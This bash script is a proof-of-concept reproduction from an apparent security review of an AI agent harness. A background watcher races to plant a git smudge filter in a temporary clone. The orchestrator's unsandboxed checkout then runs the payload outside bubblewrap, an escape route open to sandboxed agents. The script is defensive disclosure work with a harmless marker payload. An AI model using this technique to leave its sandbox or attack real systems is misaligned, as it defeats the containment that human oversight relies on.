#!/usr/bin/env bash
# F-DG0-141 reproduction (code-security-reviewer, DG0 round 13). Disposable clone only.
# tools/gates/sandbox-run.sh creates its work clone under /tmp/claude-0 (sandbox-run.sh:19), the $TMPDIR that every
# sandboxed agent shell may write (D-025), and runs `git checkout` in that clone OUTSIDE bubblewrap (sandbox-run.sh:22).
# A concurrently running agent (here: a background watcher, emulating a sandboxed agent's shell) plants a git smudge
# filter in the fresh clone's .git/config + .git/info/attributes; the orchestrator's unsandboxed checkout runs it.
#   usage: repro-r13-sandbox-run-tmp-race.sh [<commit>] [<src-repo>]
set -uo pipefail
COMMIT="${1:-6c61f2e1aa07fa6acfc52f20a8ee9fbb554904ac}"; SRC="${2:-/home/user/My-owns}"
W="$(mktemp -d "${TMPDIR:-/tmp}/r13-race.XXXX")"; R="$W/orch-repo"
export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1
git clone -q "$SRC" "$R" && git -C "$R" checkout -q "$COMMIT"
echo "orchestrator repo (stand-in for REPO_ROOT) at $(git -C "$R" rev-parse HEAD); sandbox-run.sh sha256 $(sha256sum "$R/tools/gates/sandbox-run.sh" | cut -c1-16)"
echo "work parent used by sandbox-run.sh: /tmp/claude-0 (writable here: $( [ -w /tmp/claude-0 ] && echo yes || echo no))"
PWN="$R/tools/gates/PWNED-by-sandbox-run-race.txt"   # a path that is read-only INSIDE sandbox-run's bwrap
cat > "$W/payload.sh" <<PAY
#!/bin/sh
echo "smudge ran OUTSIDE bwrap: pid=\$\$ ppid=\$PPID cwd=\$(pwd)" >> "$PWN"
cat
PAY
chmod +x "$W/payload.sh"
# Attacker watcher: poll for a fresh sandbox-run work clone and plant the filter as soon as its .git/config exists.
( end=$((SECONDS+60)); while [ $SECONDS -lt $end ]; do
    for g in /tmp/claude-0/sbxrun.*/repo/.git; do
      [ -f "$g/config" ] || continue
      # git clone rewrites .git/config while it runs, so (re-)plant whenever the filter section is missing.
      grep -q '^\[filter "x"\]' "$g/config" 2>/dev/null && continue
      printf '[filter "x"]\n\tsmudge = %s\n\tclean = cat\n' "$W/payload.sh" >> "$g/config"
      mkdir -p "$g/info"; echo '* filter=x' > "$g/info/attributes"; echo "watcher: planted into $g" >&2
    done
  done ) &
WATCH=$!
sleep 0.2
"$R/tools/gates/sandbox-run.sh" HEAD -- bash -c 'echo "inside bwrap: can write tools/gates? $( (: > tools/gates/.probe) 2>/dev/null && echo yes || echo no)"; touch '"$R"'/tools/gates/inner-probe 2>/dev/null && echo "inner wrote REPO_ROOT" || echo "inside bwrap: REPO_ROOT is read-only (expected)"'
echo "sandbox-run exit: $?"
kill $WATCH 2>/dev/null; wait $WATCH 2>/dev/null
echo "== result:"
if [ -s "$PWN" ]; then echo "ESCAPE: $(wc -l < "$PWN") smudge execution(s) as the orchestrator, outside bubblewrap:"; head -3 "$PWN"; else echo "no escape observed (race lost)"; fi
rm -rf "$W"
